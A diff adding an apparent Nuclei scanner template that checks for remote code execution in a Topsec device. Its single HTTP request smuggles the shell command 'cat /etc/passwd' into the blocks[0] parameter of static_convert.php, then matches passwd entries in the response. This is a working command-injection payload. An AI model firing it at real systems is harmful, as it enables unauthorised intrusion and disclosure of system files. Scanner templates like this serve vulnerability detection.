@@ -1,0 +1,25 @@
+id: poc-yaml-topsec-rce
+
+info:
+  name: poc-yaml-topsec-rce
+  author: xiaobaicai
+  severity: critical
+  tags: xray-converted,rce,ct-456773
+  reference:
+    - https://planet.vulbox.com/detail/MTA4NDg=
+
+http:
+  - raw:
+      - |
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[^:]*:[0-9]*:[0-9]*:[^:]*"
